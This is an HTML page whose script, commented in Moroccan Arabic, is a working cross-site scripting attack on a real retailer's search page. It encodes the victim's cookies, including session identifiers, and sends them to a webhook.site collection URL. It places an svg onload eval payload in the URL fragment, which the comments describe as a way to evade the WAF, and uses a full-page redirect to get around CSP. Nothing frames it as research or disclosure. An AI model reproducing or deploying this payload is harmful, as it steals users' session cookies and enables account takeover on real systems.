<!DOCTYPE html>
<html>
<body>
    <script>
        // كود سحب الكوكيز (بما فيها الـ OSID و edge_tid)
        let payload = `
            (function(){
                var cookies = btoa(unescape(encodeURIComponent(document.cookie)));
                var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0?leak=" + cookies;
                
                // تحويل الصفحة بالكامل باش نهربو من الـ CSP
                window.location.replace(webhook);
            })();
        `;

        let encoded = encodeURIComponent(payload);
        
        // ديما كنخدمو بالـ Hash # حيت هو اللي كيسلكنا من الـ WAF
        let target = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";

        window.location.href = target;
    </script>
</body>
</html>
